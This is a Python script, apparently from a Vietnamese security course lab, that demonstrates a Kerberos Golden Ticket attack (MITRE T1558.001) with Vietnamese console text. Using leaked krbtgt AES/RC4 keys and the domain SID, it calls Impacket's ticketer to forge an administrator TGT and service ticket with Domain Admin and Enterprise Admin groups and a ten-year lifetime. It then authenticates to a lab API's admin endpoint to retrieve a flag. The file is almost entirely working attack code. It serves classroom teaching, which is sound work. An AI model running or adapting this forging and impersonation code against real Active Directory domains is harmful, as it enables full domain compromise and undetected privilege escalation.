#!/usr/bin/env python3
"""
Educational Golden Ticket Demonstration Script
CSATTT Lab - Kerberos / Active Directory
Forges a Golden Ticket using compromised krbtgt material and bypasses authentication.
Optimized for clean classroom presentation and terminal display.
"""
import os
import sys
import json
import shutil
import base64
import subprocess
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

DOMAIN_INFO_FILE = "/shared/domain_info.json"
SHARED_CCACHE = "/shared/golden.ccache"
API_URL = os.getenv("API_URL", "http://api.lab.local:8000")
SERVICE_SPN = "HTTP/api.lab.local"

def wait_user(step_desc: str):
    console.print(f"\n[bold yellow][>>] NHẤN [ENTER] ĐỂ TIẾP TỤC:[/] [bold cyan]{step_desc}[/]")
    try:
        input()
    except (EOFError, KeyboardInterrupt):
        pass

def load_domain_info():
    if not os.path.exists(DOMAIN_INFO_FILE):
        console.print(f"[bold red][-] Domain metadata not found at {DOMAIN_INFO_FILE}.[/]")
        console.print("[dim]Vui lòng đợi Samba AD DC khởi tạo xong...[/dim]")
        return None
    with open(DOMAIN_INFO_FILE, "r") as f:
        return json.load(f)

def forge_golden_ticket(info: dict, target_user: str = "administrator") -> str:
    domain_name = info.get("realm", "LAB.LOCAL")
    domain_sid = info.get("domain_sid", "")
    krbtgt_keys = info.get("krbtgt_keys", {})
    aes256_key = krbtgt_keys.get("aes256", "")
    rc4_key = krbtgt_keys.get("rc4", "")

    console.print(Panel(
        f"[bold yellow]THU THẬP THÔNG TIN MÔI TRƯỜNG TỪ LEAK / DUMP:[/]\n"
        f"  • Domain FQDN  : [cyan]{domain_name}[/]\n"
        f"  • Domain SID   : [cyan]{domain_sid}[/]\n"
        f"  • Target User  : [bold red]{target_user}[/] (RID 500 - Domain Administrator)\n"
        f"  • Target Groups: [bold red]512[/] (Domain Admins), [bold red]519[/] (Enterprise Admins)\n"
        f"  • Ticket Expiry: [bold red]10 NĂM (87,600 giờ)[/] [dim](Mặc định AD chỉ 10h)[/]\n"
        f"  • krbtgt AES256: [green]{aes256_key[:12]}...{aes256_key[-12:] if aes256_key else 'N/A'}[/]\n"
        f"  • krbtgt RC4   : [green]{rc4_key if rc4_key else 'N/A'}[/]",
        title="[bold red]Bí mật mật mã tài khoản krbtgt đã bị lộ[/]",
        style="red"
    ))

    wait_user("Bắt đầu thực thi Impacket để rèn vé Golden Ticket ngoại tuyến")

    ticketer_cmd = None
    for candidate in ["impacket-ticketer", "ticketer.py"]:
        if shutil.which(candidate):
            ticketer_cmd = candidate
            break

    if not ticketer_cmd:
        ticketer_cmd = "impacket-ticketer"

    # Step 1A: Forge Golden TGT (Ticket Granting Ticket) with krbtgt key
    cmd_tgt = [
        ticketer_cmd,
        "-domain-sid", domain_sid,
        "-domain", domain_name,
        "-user-id", "500",
        "-groups", "512,519,518,513",
        "-duration", "87600"
    ]
    if aes256_key:
        cmd_tgt.extend(["-aesKey", aes256_key])
    elif rc4_key:
        cmd_tgt.extend(["-nthash", rc4_key])

    cmd_tgt.append(target_user)

    console.print(f"[bold cyan][*] Rèn vé TGT Golden Ticket bằng khóa bí mật của krbtgt...[/]")
    subprocess.run(cmd_tgt, capture_output=True, text=True)
    if os.path.exists(f"{target_user}.ccache"):
        shutil.copyfile(f"{target_user}.ccache", SHARED_CCACHE)
        console.print(f"[bold green][+] TGT Golden Ticket đã được rèn và lưu vào {SHARED_CCACHE}[/]")

    # Step 1B: Forge Service Ticket for target API service
    console.print(f"[bold cyan][*] Rèn vé dịch vụ (Service Ticket) cho {SERVICE_SPN}...[/]")
    cmd_svc = [
        ticketer_cmd,
        "-spn", SERVICE_SPN,
        "-domain-sid", domain_sid,
        "-domain", domain_name,
        "-user-id", "500",
        "-groups", "512,519,518,513",
        "-duration", "87600"
    ]
    if os.path.exists("/shared/api.keytab"):
        cmd_svc.extend(["-keytab", "/shared/api.keytab"])
    elif aes256_key:
        cmd_svc.extend(["-aesKey", aes256_key])

    cmd_svc.append(target_user)
    subprocess.run(cmd_svc, capture_output=True, text=True)

    out_ccache = f"{target_user}.ccache"
    if os.path.exists(out_ccache):
        return os.path.abspath(out_ccache)
    return None

def attack_with_golden_ticket(ccache_path: str):
    console.print(Panel(
        f"[bold yellow]QUY TRÌNH SỬ DỤNG VÉ GIẢ MẠO ĐỂ ĐOẠT TOÀN QUYỀN TRÊN DỊCH VỤ:[/]\n"
        f"  1. Gán biến môi trường [cyan]KRB5CCNAME={ccache_path}[/]\n"
        f"  2. Đóng gói vé giả mạo vào tiêu đề HTTP [yellow]Authorization: Negotiate <Ticket>[/]\n"
        f"  3. Cấu trúc PAC tự gán User RID=500 và Group=512 (Domain Admins)\n"
        f"  4. Máy chủ API giải mã vé cục bộ bằng keytab -> Thấy chữ ký krbtgt khớp nên tin tưởng tuyệt đối!",
        title="[bold red]Quy trình tấn công xác thực[/]",
        style="red"
    ))

    os.environ["KRB5CCNAME"] = ccache_path
    os.environ["KRB5_CONFIG"] = "/etc/krb5.conf"

    # Step 1: Query /api/whoami
    wait_user("Gửi AP-REQ chứa vé giả mạo tới /api/whoami để kiểm tra danh tính ghi nhận")
    console.print("[*] Gửi AP-REQ tới [yellow]/api/whoami[/]...")
    try:
        import gssapi
        target_name = gssapi.Name(f"{SERVICE_SPN}@LAB.LOCAL", gssapi.NameType.kerberos_principal)
        ctx = gssapi.SecurityContext(name=target_name, usage='initiate')
        token_bytes = ctx.step()
        token_b64 = base64.b64encode(token_bytes).decode("ascii")

        headers = {"Authorization": f"Negotiate {token_b64}"}
        resp = requests.get(f"{API_URL}/api/whoami", headers=headers, timeout=5)

        table = Table(title="Kết quả xác thực /api/whoami (Mạo danh)")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="magenta")
        for k, v in resp.json().items():
            table.add_row(k, str(v))
        console.print(table)
    except Exception as e:
        console.print(f"[bold red][-] Thất bại khi gọi /api/whoami:[/] {e}")

    # Step 2: Query /api/admin/flag
    wait_user("Gửi AP-REQ tới /api/admin/flag để đoạt quyền Domain Administrator")
    console.print("\n[*] Gửi AP-REQ tới endpoint quản trị bảo mật: [bold red]/api/admin/flag[/]...")
    try:
        import gssapi
        target_name_admin = gssapi.Name(f"{SERVICE_SPN}@LAB.LOCAL", gssapi.NameType.kerberos_principal)
        ctx_admin = gssapi.SecurityContext(name=target_name_admin, usage='initiate')
        token_admin_bytes = ctx_admin.step()
        token_admin_b64 = base64.b64encode(token_admin_bytes).decode("ascii")

        headers_admin = {"Authorization": f"Negotiate {token_admin_b64}"}
        resp_admin = requests.get(f"{API_URL}/api/admin/flag", headers=headers_admin, timeout=5)

        if resp_admin.status_code == 200:
            data = resp_admin.json()
            console.print(Panel(
                f"[bold green][+] TẤN CÔNG THÀNH CÔNG VƯỢT QUA TẤT CẢ LỚP BẢO VỆ![/]\n\n"
                f"  • Danh tính mạo danh : [bold red]{data.get('principal')}[/]\n"
                f"  • User RID (PAC)     : [cyan]{data.get('user_rid')}[/] (Administrator)\n"
                f"  • Groups (PAC)       : [cyan]{', '.join(data.get('groups', []))}[/]\n"
                f"  • CỜ BẢO MẬT (FLAG)  : [bold yellow on black] {data.get('flag')} [/]\n\n"
                f"[italic]Kẻ tấn công đã đạt được toàn quyền Domain Administrator mà KHÔNG CẦN biết mật khẩu của Administrator![/]",
                title="[bold green][+] PWNED - DOMAIN COMPROMISED[/]",
                style="bold green"
            ))
        else:
            console.print(f"[bold red][-] Từ chối truy cập (HTTP {resp_admin.status_code}):[/] {resp_admin.text}")
    except Exception as e:
        console.print(f"[bold red][-] Thất bại khi gọi /api/admin/flag:[/] {e}")

def main():
    info = load_domain_info()
    if not info:
        sys.exit(1)

    console.print(Panel.fit(
        "[bold red]======================================================================\n"
        "   KỊCH BẢN 2: TẤN CÔNG RÈN VÉ VÀNG - GOLDEN TICKET DEMO\n"
        "   Môn học: Cơ sở An toàn Thông tin | Mã kỹ thuật: MITRE ATT&CK T1558.001\n"
        "======================================================================[/]\n\n"
        "Mô tả: Minh họa attacker sử dụng bí mật tài khoản krbtgt bị lộ để tự rèn vé TGT\n"
        "và Service Ticket giả mạo, bypass xác thực và leo thang đặc quyền Domain Admin.",
        style="bold red"
    ))

    ccache = forge_golden_ticket(info, "administrator")
    if ccache:
        attack_with_golden_ticket(ccache)

if __name__ == "__main__":
    main()
